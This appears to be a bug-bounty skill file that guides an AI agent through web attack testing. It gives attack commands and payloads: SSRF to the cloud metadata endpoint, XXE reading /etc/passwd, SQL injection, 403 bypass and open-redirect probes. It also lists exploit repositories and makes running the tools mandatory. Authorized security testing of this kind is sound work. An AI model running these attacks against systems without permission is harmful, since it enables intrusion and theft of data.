---
name: security-web-attacks
description: "Use during Phase 0C for web2 attack playbooks."
metadata:
  hermes:
    budget_kb: 30
    tags: [xss, sqli, ssrf, injection, security, bug-bounty]
---

# Web Attack Playbooks (Phase 0C-Web2)

> API-Gateway webhook receiver auth-inconsistency → `references/api-gateway-webhook-auth-inconsistency.md` (enumerate `/{provider}/webhook`; the 403-vs-200 asymmetry is the missing-auth signal).

## ⛔ CANDIDATE RULE (MANDATORY — EVERY TEST)
- **Each test = one candidate. Finding something = mark candidate. CONTINUE to next test.**
- **Candidates become FINDINGS only after Phase 5 REPORT GATE (Phase 0F).**
- **DO NOT generate report during Phase 0C. Report = ABSOLUTE LAST.**
- **If you find CRITICAL → mark candidate → KEEP TESTING. Do NOT stop.**

## ⛔ Load Rules
- Load ONLY during Phase 0C (testing phase) for web2 targets
- EVICT before loading Phase 0F (report)
- Load alongside security-scanners for complete coverage

## ⛔ REFERENCE AUTO-LOAD (MANDATORY — load when this skill is activated)
When this skill is loaded, IMMEDIATELY read these reference files:
```
read_file('references/rpc-fingerprint.md')
read_file('references/web-attack-playbooks.md')
read_file('references/nosqli-guide.md')
```
- Budget: 30KB — read_file for detailed playbooks

---

## Attack Vector Playbooks

### /SSRF — Server-Side Request Forgery
```bash
python3 -m ssrfmap -r request.txt -p url -m portscan
python3 gopherus.py --exploit fastcgi
python3 gopherus.py --exploit redis
curl -v "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
```
**Repos:** swisskyrepo/SSRFmap (3.6K), tarunkant/Gopherus (3.4K)

**SaaS connector SSRF pattern** — the unauthenticated `validate_domain` / `test_connection` endpoints of connector platforms (self-hosted Jira/GitHub Enterprise/etc.) make server-side requests to the attacker-supplied domain; only *self-hosted* provider names actually SSRF (cloud names return `valid:true` without connecting). Full recipe incl. the webhook.site canary (when interactsh won't emit a URL) + honest escalation limits: `references/connector-validate-domain-ssrf.md`.

### /XSS — Cross-Site Scripting
```bash
dalfox url "https://target.com/page?q=test" --skip-bav
echo "https://target.com/page?q=test" | kxss
bxss -u https://target.com -p YOUR_BLIND_XSS
curl -sI https://target.com | grep -i content-security-policy
```
**Repos:** terjanq/Tiny-XSS-Payloads (2.4K), hakluke/weaponised-XSS-payloads (1.4K), t3l3machus/toxssin (1.4K), renniepak/CSPBypass (719), kleiton0x00/ppmap (520)

### /SQLI — SQL Injection
```bash
sqlmap -u "https://target.com/page?id=1" --batch --risk=3 --level=5
sqlmap -r request.txt --batch --dbs
# Error-based: ' OR 1=1-- | Boolean: ' AND 1=1-- vs ' AND 1=2--
# Time-based: ' AND SLEEP(5)--
```
**Repos:** eslam3kl/SQLiDetector (643)

### /IDOR — Insecure Direct Object Reference
```bash
# Change ID in request: /api/users/123 → /api/users/124
# Two identities needed: test with user A, access user B's resources
# Check: Authorization header vs resource ownership
```

### /RACE — Race Condition
```bash
# Send N concurrent requests to same endpoint
# Check: double-spend, double-claim, bypass limit
```

### /GRAPHQL — GraphQL Attacks
```bash
curl -X POST https://target.com/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
# Batch query attack, field suggestion info leak
```
**Repos:** doyensec/inql (1.8K)

### /AUTH — Authentication Bypass
```bash
# Autorize (Burp extension) — auto-detect authz bypass
# JWT: alg=none attack, key confusion, expired token
# OAuth: redirect_uri manipulation, state parameter bypass
```
**Repos:** Quitten/Autorize (1.2K)

### /403BYPASS — 403 Forbidden Bypass
```bash
curl -v https://target.com/admin/../admin
curl -v https://target.com/%2f/admin
curl -v -H "X-Original-URL: /admin" https://target.com/
curl -v -H "X-Rewrite-URL: /admin" https://target.com/
```
**Repos:** sting8k/BurpSuite_403Bypasser (1.7K)

### /CACHE — Web Cache Deception
```bash
curl -v "https://target.com/account.css"
curl -v "https://target.com/account%23.css"
# Check Vary, Cache-Control, X-Cache headers
```

### /COMMAND — OS Command Injection
```bash
python3 commix.py --url="https://target.com/cmd?cmd=test" --batch
# Manual: ;, |, ||, &&, $(), `` in parameters
```
**Repos:** commixproject/commix (5.8K)

### /XXE — XML External Entity
```bash
xml='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
curl -X POST -d "$xml" -H "Content-Type: application/xml" https://target.com/api
```
**Repos:** luisfontes19/xxexploiter (617)

### /SMUGGLING — HTTP Request Smuggling
```bash
python3 smuggler.py -u https://target.com -p /api
```
**Repos:** defparam/smuggler (2.1K), nccgroup/BurpSuiteHTTPSmuggler (744)

### /SSTI — Server-Side Template Injection
```bash
# Detection: {{7*7}} → 49 = vulnerable
# Payload: {{config}} or ${7*7} depending on template engine
```

### /OPENREDIRECT — Open Redirect
```bash
curl -v "https://target.com/redirect?url=https://evil.com"
# Variations: //evil.com, /%0d%0aLocation:evil.com
```

### /MASSASSIGN — Mass Assignment
```bash
# Add extra fields: {"user":"test","role":"admin","is_admin":true}
```

### /PROXYHDR — Untrusted client-IP header reflected into the response
```bash
# Which headers does the server trust? one at a time, no -L (redirects hide the first hop's headers)
for hdr in "X-Forwarded-For: 1.2.3.4" "X-Real-IP: 9.9.9.9" "Client-IP: 6.6.6.6" "Forwarded: for=7.7.7.7"; do
  curl -s -A "Mozilla/5.0" -H "$hdr" -D - -o /dev/null "https://TARGET/path" | grep -i '^set-cookie'
done
# then escalate: CRLF (raw socket) -> cookie attr injection -> cache -> fixation -> ACL -> DIFFERENTIAL SWEEP
```
⚠️ **Most of these are Low.** Run the full ladder and report the rung that fails, not the rung that
looks scary. Read `references/proxy-header-trust-testing.md` — it has the ladder, the raw-socket CRLF
probe, the decisive host×path differential sweep (`clean` vs `X-Forwarded-For: 127.0.0.1`, compare
status + body sha256), and the honest-reporting wording.

### /CONTROLS — proving a control HOLDS with tool evidence (negative-result battery)
When a finding has been reported and the engagement continues — or the operator demands "negative results
with tool evidence" — run the fixed battery instead of improvising: rate-limit header spoofing
(`X-Real-IP`/`X-Forwarded-For` rotation), CL.TE/TE.CL smuggling over raw sockets, WebSocket GraphQL
subscription authz, the full unauthenticated mutation sweep (and the "argument validation runs before the
auth check" trap), `Host`-header password-reset poisoning (own account only), Next.js `/_next/image` +
NextAuth `callbackUrl` + source-map checks, app-level SSRF proxies (the `lnurl-proxy` shape), proof-of-
ownership discipline for buckets/CNAMEs, and mobile manifest/ATS static review. Exact requests, the
"control holds" response signatures, and the evidence-file naming are in
`references/unauth-control-battery.md`.

---

## Weaponized Payload Collections
- `swisskyrepo/PayloadsAllTheThings` ⭐80.9K — MASTER payload list
- `terjanq/Tiny-XSS-Payloads` — tiny XSS for different contexts
- `hakluke/weaponised-XSS-payloads` — XSS → P1 escalation
- `pgaijin66/XSS-Payloads` — advanced XSS vectors
- `RenwaX23/XSS-Payloads` — XSS vectors
- `nettitude/xss_payloads` — XSS exploitation
- `foospidy/payloads` — web attack payload collection
- `3516634930/Payloader` — payload quick reference (XSS/SQLi/SSRF/RCE)
- `zigoo0/JSONBee` — JSONP endpoints for CSP bypass
- `whitel1st/docem` — XXE/XSS in docx, odt, pptx, xlsx
- `Netflix-Skunkworks/sleepy-puppy` — XSS payload management
- `ethicalhackingplayground/bxss` — Blind XSS scanner
- `yaph/domxssscanner` — DOM XSS source analysis
- `HackUnderway/xss_scanner` — XSS evasion scanner
- `AiGptCode/Ai-Security-URL` — web vuln exploit functions
- `codingo/NoSQLMap` — NoSQL injection automation
- `h4r5h1t/webcopilot` — param enum + vuln filter
- `wagiro/BurpBounty` — Burp scan check builder

### CMS/Framework Exploits
- `zhzyker/exphub` ⭐4.3K — Weblogic/Struts2/Tomcat/Nexus/Solr exploit scripts
- `k8gege/ZimbraExploit` — Zimbra XXE/RCE/SSRF/Upload
- `cisagov/log4j-scanner` — Log4Shell scanner

### API Security
- `flipkart-incubator/Astra` ⭐2.7K — Automated REST API security testing
- `erev0s/VAmPI` ⭐1.3K — Vulnerable REST API lab (OWASP top 10)
- `Teycir/BurpAPISecuritySuite` — Burp API security testing (15 attack types)
- `Cy-S3c/BurpMCP-Ultra` — AI-powered MCP server for Burp Suite

### Exploit DB / CVE / PoC
- `trickest/cve` ⭐8.1K — CVE + PoC aggregator
- `nomi-sec/PoC-in-GitHub` ⭐8.1K — PoC auto-collect
- `offensive-security/exploitdb` ⭐7.9K — ExploitDB (legacy)
- `Mr-xn/Penetration_Testing_POC` ⭐7.5K — POC/EXP collection
- `bikini/exploitarium` ⭐5.1K — exploit PoC archive
- `strozfriedberg/Windows-Exploit-Suggester` — Win privesc suggester
- `vulnersCom/nmap-vulners` — nmap → CVE NSE scripts
- `vulnersCom/getsploit` — exploit search
- `Notselwyn/CVE-2024-1086` — LPE PoC
- `offensive-security/exploitdb-bin-sploits` — bin sploits (archived)
- `NebuSec/CyberMeowfia` — CVE PoCs
- `0xMarcio/pocindex` — PoC search (82K exploits)
- `danigargu/CVE-2020-0796` — SMBGhost PoC
- `rastating/wordpress-exploit-framework` — WP exploit framework
- `Puliczek/CVE-2021-44228-PoC-log4j-bypass-words` — log4j WAF bypass
- `lockedbyte/CVE-Exploits` — CVE PoC collection
- `SofianeHamlaoui/Lockdoor-Framework` — pentest framework
- `incredibleindishell/SSRF_Vulnerable_Lab` — SSRF practice lab
- `infosecn1nja/Red-Teaming-Toolkit` — red team tool index
- `skavngr/rapidscan` — multi-tool web scanner

---

## Methodology Notes
- `AlbusSec/Penetration-List` — vuln-type resource index
- `xalgord/Massive-Web-App-Pentest-Notes` — full methodology
- `HolyBugx/HolyTips` — checklists + writeups
- `KingOfBugbounty/KingOfBugBountyTips` — tips
- `uphiago/recon-skills` — CORS/XSS/SQLi/SSRF skill pack
- `dafthack/CloudPentestCheatsheets` — cloud pentest cheatsheets
- `bl4de/security-tools` — Python/Bash security tools
- `ronin-rb/ronin` — Ruby security toolkit

---

## ⛔ VERIFICATION
Before claiming testing complete, run:
```bash
python ~/.chiper/skills/bounty-pack/audit-checkpoint.py <target_dir> --phase 0C
```
Checkpoint reads actual vector output files from disk.

## ⛔ ATTACK ENFORCEMENT (MANDATORY)
Setiap playbook attack di skill ini WAJIB dijalankan dengan TOOLS yang tepat — bukan hanya curl.
Baca referensi PoC, ikuti panduan attack yang ada, jalankan tools-nya.

Contoh:
- SQLi → jalankan sqlmap (bukan cuma curl manual)
- XSS → jalankan dalfox/kxss (bukan cuma payload manual)
- SSRF → gunakan SSRFmap/Interactsh (bukan cuma curl ke internal)
- XXE → gunakan XXEinjector (bukan cuma curl XML manual)
- SSTI → gunakan Tplmap (bukan cuma {{7*7}} manual)
- GraphQL → gunakan InQL/graphql-map (bukan cuma introspection curl)
- Subdomain takeover → gunakan subjack/takeover (bukan cuma manual check)
- Open redirect → gunakan Oralyzer (bukan cuma redirect test)
- CORS → gunakan CORScanner (bukan cuma Origin header curl)

Baca setiap reference file di skill ini → eksekusi tool yang direkomendasikan → buktikan dengan terminal output asli.
Jangan skip tool karena "curl sudah cukup" — curl HANYA fallback kalau tool tidak bisa diinstall.
Jangan claim "vuln X tidak ada" tanpa JALANKAN tool-nya dulu.

## AI/Agent Patterns
- `GH05TCREW/pentestagent` — AI pentest agent framework
- `Armur-Ai/Pentest-Swarm-AI` — swarm agent orchestration
- `test-zeus-ai/testzeus-hercules` — AI test agent
- `toby-bridges/api-relay-audit` — LLM proxy audit (prompt injection)
- `SHAdd0WTAka/Zen-Ai-Pentest` — AI pentest framework
- `silentchainai/SILENTCHAIN` — AI Burp scanner extension
- `aress31/burpgpt` — Burp GPT passive scan
- `hypnguyen1209/offensive-claude` — AI offensive toolkit

---

## Integrated Repos (66)

| Category | Count | Top Repos |
|----------|-------|-----------|
| Payloads/Collections | 10 | PayloadsAllTheThings, XSS-Payloads, JSONBee, docem |
| XSS/CSP/Prototype | 12 | terjanq, hakluke, renniepak, ppmap, bxss, domxssscanner |
| SSRF/XXE/Smuggling | 6 | SSRFmap, Gopherus, smuggler, xxexploiter, SSRF_Vulnerable_Lab |
| SQLi/NoSQLi | 3 | SQLiDetector, NoSQLMap, webcopilot |
| IDOR/Auth | 4 | Autorize, BurpAPISecuritySuite, BurpMCP-Ultra, Lockdoor |
| Command Injection | 2 | commix, webcopilot |
| Exploit DB/CVE | 16 | trickest/cve, exploitdb, PoC-in-GitHub, pocindex, CVE-Exploits |
| CMS/Framework | 3 | exphub, ZimbraExploit, log4j-scanner |
| API Security | 4 | Astra, VAmPI, BurpAPISecuritySuite, BurpMCP-Ultra |
| WAF/403 | 3 | 403Bypasser, HTTPSmuggler, afrog |
| AI/Agent | 8 | PentestAgent, Swarm-AI, ReconAIzer, etc |
| Recon/Methodology | 5 | Awesome-Tools, Writeups, HolyTips, Massive-Notes |
| Other | 7 | rapidscan, zen-ai-pentest, SILENTCHAIN, etc |

---

## Cross-References
- Recon → `security-recon` (Phase 0B)
- Scanners → `security-scanners` (Phase 0C)
- Cloud → `security-cloud` (Phase 0C)
- Report → `bug-report-delivery` (Phase 0F, ABSOLUTE LAST)

## References
- `references/rpc-fingerprint.md` — RPC endpoint fingerprinting + node security assessment (66 repos + node exploit tools)
- `references/web-attack-playbooks.md` — 66 web2 attack repos with tool selection guide
- `references/nosqli-guide.md` — NoSQL injection: MongoDB/CouchDB exploitation (NoSQLMap 3350★)
- `references/proxy-header-trust-testing.md` — `/PROXYHDR`: untrusted `X-Forwarded-For` / `Client-IP` used in session tokens, `Set-Cookie` values, logs or ACLs. The escalation ladder (CRLF raw-socket probe → cookie-attribute injection → cache → fixation → ACL bypass → **differential sweep**), the redirect-capture pitfall that silently voids a sweep, and the honest Low-severity reporting shape for an unpaid VDP.
- `references/unauth-control-battery.md` — `/CONTROLS`: the fixed negative-result battery (limiter header spoof, CL.TE/TE.CL smuggling, WS subscription authz, unauth GraphQL sweep + federation-error leak, reset-link `Host` poisoning, Next.js image/callbackUrl/source-map, app-level SSRF proxies, bucket/CNAME ownership discipline, mobile manifest review) with exact requests, "control holds" signatures and evidence naming.
- `references/sap-btp-and-powerbi-surface.md` — SAP BTP approuter fingerprint (the `fragmentAfterLogin` / `locationAfterLogin` / value-bound `signature` cookie trio, IAS login chain, `sap_idp=` is not an open redirect), how to decide whether self-registration is open WITHOUT fabricating an identity, the Power BI embed-token broker recipe (`/index?handler=EmbedInfo` — decode the gzip+base64url token, prove it is scoped via a 403 on the Power BI REST API, and stop at the no-allowlist boundary instead of claiming cross-tenant access), and the ASP.NET Razor `?handler=` parameter-abuse trigger list that yields a CWE-209 verbose stack trace.
